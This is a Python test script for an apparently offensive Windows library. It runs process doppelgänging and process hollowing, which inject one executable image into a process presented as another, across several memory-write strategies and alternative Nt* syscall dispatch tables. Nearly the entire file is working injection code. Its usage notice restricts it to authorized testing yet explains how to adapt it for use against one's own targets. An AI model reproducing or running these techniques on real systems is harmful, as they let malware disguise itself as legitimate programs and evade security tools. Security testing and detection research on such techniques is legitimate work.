# =============================================================================
# IMPORTANT USAGE NOTICE
# 1. Use only for authorized, non-malicious education, research, and testing.
# 2. This script is part of the test suite. It requires the config globals declared in the header;
#    pass every required value explicitly (for example, with the CLI '--config' option),
#    using `null` when a value is intentionally unset.
# 3. For standalone use with your own targets, it's more convenient to replace the globals
#    with concrete values and keep only the logic you need.
# =============================================================================

# globals (config)
ORIGINAL_IMAGE_FILEPATH = ORIGINAL_IMAGE_FILEPATH
INJECTED_IMAGE_FILEPATH = INJECTED_IMAGE_FILEPATH

# script
from enum import IntEnum

import br3k
from br3k import FsFileMode, FsSectionMode, ProcessVmWriteStrategy

class ImageInjectType(IntEnum):
    ProcessDoppel = 1
    ProcessHollow = 2

SYS_API_DISPATCH_ALTERNATIVE = {
    "CreateProcess": "NtCreateProcess",
    "CreateThread": "NtCreateThread",
    "CreateSection": "NtCreateSectionEx",
    "MapViewOfSection": "NtMapViewOfSectionEx",
    "UnmapViewOfSection": "NtUnmapViewOfSectionEx",
    "AllocateVirtualMemory": "NtAllocateVirtualMemoryEx",
    "ReadVirtualMemory": "NtReadVirtualMemoryEx",
}

SYS_API_DISPATCH_CASES = (
    ("default", None),
    ("alternative", SYS_API_DISPATCH_ALTERNATIVE),
)

def enum_items(enum_type, exclude=()):
    return [
        value
        for value in enum_type
        if value not in exclude
    ]

def enum_case_name(value):
    return value.name if value is not None else None

def init_sysapi(sys_api_dispatch):
    if sys_api_dispatch is None:
        br3k.init_sysapi()
    else:
        br3k.init_sysapi(sys_api_dispatch=sys_api_dispatch)

def inject_process_doppel(process_vm_write_strategy):
    temp_image_path = br3k.fs_get_temp_path("br3k_test_image.exe")
    injected_image = br3k.FileMapping(INJECTED_IMAGE_FILEPATH)

    tx = br3k.Transaction("TH")
    tx.create()

    tx.set()
    handle = br3k.fs_create_file(temp_image_path, file_mode=FsFileMode.ReadWrite)
    tx.unset()

    br3k.fs_write_file(handle, data=injected_image.data, size=injected_image.size)
    del handle

    tx.set()
    handle = br3k.fs_open_file(temp_image_path)
    tx.unset()

    section_handle = br3k.fs_create_file_section(handle, sect_mode=FsSectionMode.Execute)
    del handle

    tx.rollback()

    process = br3k.Process(
        section_handle=section_handle,
        process_vm_write_strategy=process_vm_write_strategy
    )
    process.create()

    proc_params = br3k.PRTL_USER_PROCESS_PARAMETERS(filepath=ORIGINAL_IMAGE_FILEPATH)
    basic_info = process.get_basic_info()

    process.init_memory()
    process.write_peb_proc_params(basic_info.PebBaseAddress, proc_params)

    injected_pe = br3k.Pe(
        data=injected_image.data,
        size=injected_image.size,
        is_file=True
    )

    peb = process.read_peb()
    thread = br3k.Thread(process)
    thread.create(ep=peb.ImageBaseAddress + injected_pe.ep_address())

def inject_process_hollow(process_vm_write_strategy):
    image = br3k.FileMapping(ORIGINAL_IMAGE_FILEPATH)
    pe = br3k.Pe(
        data=image.data,
        size=image.size,
        is_file=True
    )
    mem_image = pe.build_mem_image()

    process = br3k.Process(
        image_path=INJECTED_IMAGE_FILEPATH,
        process_vm_write_strategy=process_vm_write_strategy
    )
    process.create_user(suspended=True)
    process.init_memory()
    process.create_memory(size=len(mem_image))
    ep = process.get_memory_remote_address()
    process.write_mem_image(mem_image)

    thread = process.main_thread
    thread.set_ep(new_thread=True, ep=ep)
    thread.resume()

def iter_cases():
    for process_vm_write_strategy in enum_items(ProcessVmWriteStrategy):
        for image_inject_type in ImageInjectType:
            yield image_inject_type, process_vm_write_strategy

def run_case(image_inject_type, process_vm_write_strategy):
    if image_inject_type == ImageInjectType.ProcessDoppel:
        inject_process_doppel(process_vm_write_strategy)
    elif image_inject_type == ImageInjectType.ProcessHollow:
        inject_process_hollow(process_vm_write_strategy)
    else:
        raise Exception("unknown image injection type")

if __name__ == "__main__":

    print("Script: Test process image injection techniques")
    print()

    total_count = 0
    failed_count = 0

    for sys_api_dispatch_name, sys_api_dispatch in SYS_API_DISPATCH_CASES:
        init_sysapi(sys_api_dispatch)

        for image_inject_type, process_vm_write_strategy in iter_cases():
            case_name = (
                f"sys_api_dispatch={sys_api_dispatch_name} / "
                f"{enum_case_name(image_inject_type)} / "
                f"process_vm_write_strategy={enum_case_name(process_vm_write_strategy)}"
            )

            total_count += 1
            print(f"Case: {case_name}")

            try:
                run_case(image_inject_type, process_vm_write_strategy)
                print(f"Case passed: {case_name}")
            except Exception as e:
                failed_count += 1
                print(f"Case failed: {case_name}: {type(e).__name__}: {e}")

            print()

    print(f"Cases completed: {total_count - failed_count}/{total_count}")

    if failed_count > 0:
        raise Exception(f"{failed_count} process image injection case(s) failed")
